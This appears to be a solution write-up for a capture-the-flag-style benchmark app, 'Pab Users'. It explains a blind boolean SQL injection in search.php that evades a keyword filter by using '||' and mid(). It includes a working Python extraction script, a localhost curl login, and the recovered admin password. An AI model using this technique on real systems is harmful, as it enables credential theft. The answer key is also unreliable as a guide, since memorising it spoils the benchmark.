# XBEN-095-24 — Pab Users

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Blind (boolean-based) SQL injection in `search.php`, which builds a query via
raw string concatenation: `SELECT * from users where username="<input>"`. A weak filter blocks
whitespace and the keywords `and|null|where|limit|like|substring|substr` (case-insensitive), but:
- spaces aren't needed if the payload has none,
- `||` (logical OR) is not filtered,
- `mid()` works identically to `substring()`/`substr()` but isn't matched by the filter regex.

`login.php` itself uses a parameterized `mysqli` prepared statement (not injectable), but its flag
disclosure only requires knowing the admin's plaintext password, which can be extracted through the
injectable `search.php` endpoint and then used to log in normally.

Payload shape: `zzz"||<boolean condition>||"` — `zzz` guarantees the literal `username="zzz"` term
is false, the injected boolean condition is OR'd in (true/false controls whether any row is
returned), and the trailing `"` opens an empty string literal that the endpoint's own
`"`-appended template text closes, keeping the SQL syntactically valid.

## Exploit

```python
import requests, string

BASE = "http://localhost:63628/search.php"
charset = string.ascii_letters + string.digits

def oracle(cond):
    payload = f'zzz"||{cond}||"'
    r = requests.post(BASE, data={"username": payload})
    return "User exists" in r.text

# 1. Get password length
length = next(l for l in range(1, 40) if oracle(f'length(password)={l}'))

# 2. Extract password one character at a time via mid()
password = ""
for pos in range(1, length + 1):
    for c in charset:
        if oracle(f'mid(password,{pos},1)="{c}"'):
            password += c
            break
print(password)   # -> thisisbestpassword (collation is case-insensitive)
```

```bash
# 3. Log in with the recovered credentials (correct casing from the source: ThisIsBestPassword)
curl -s -X POST "http://localhost:63628/login.php" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=ThisIsBestPassword"
```
